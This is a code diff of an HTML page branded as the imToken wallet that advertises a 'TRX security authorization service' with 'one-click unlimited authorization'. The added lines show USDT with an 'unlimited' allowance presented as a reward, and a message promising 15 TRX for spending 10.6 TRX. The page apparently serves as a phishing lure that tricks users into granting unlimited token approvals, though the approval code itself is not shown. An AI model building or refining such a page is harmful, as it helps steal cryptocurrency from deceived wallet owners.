@@ -210,6 +210,9 @@
         }
         .footer-info a:hover {
             text-decoration: underline;
+        } 
+        .text-right {
+            text-align: right;
         }
     </style>
 </head>
@@ -217,9 +220,6 @@
     <div class="container">
         <!-- 头部：修复多余双左尖括号 <<<i → <<i -->
         <div class="header">
-            <div class="logo">
-            <i class="fa fa-bolt"></i>
-            </div>
             <h1>imToken</h1>
             <p class="desc">TRX生态安全授权服务，支持一键无限授权，可在imToken中撤销</p>
         </div>
@@ -230,7 +230,16 @@
             未连接钱包<br>
             <span>请点击底部「连接imToken钱包」按钮</span>
         </div>
-
+        <div class="warning">
+          <div style="display: flex; justify-content: space-between; margin: 4px 0;">
+            <span>可使用奖励的代币</span>
+            <span>使用额度</span>
+          </div>
+          <div style="display: flex; justify-content: space-between; margin: 4px 0;">
+            <span><h3>USDT</h3></span>
+            <span><h3>无限</h3></span>
+          </div> 
+        </div>         
         <!-- 授权记录区：修复图标符号 -->
         <div class="record-list">
             <h3> 授权记录</h3>
@@ -418,7 +427,7 @@
 
             // 4. 激活授权按钮：仅显示地址，不显示余额
             document.getElementById("userInfo").innerHTML = `
-                已连接：<br>${userAddress.slice(0,8)}...${userAddress.slice(-6)}须消耗10.6个TRX，可领取15个TXR加密货币如放弃领取直接退出即可
+           已连接：${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>须消耗10.6个TRX，可领取15个TRX加密货币如放弃领取直接退出即可
             `;
             approveBtn.disabled = false;
             // 确保授权按钮显示（避免意外隐藏）
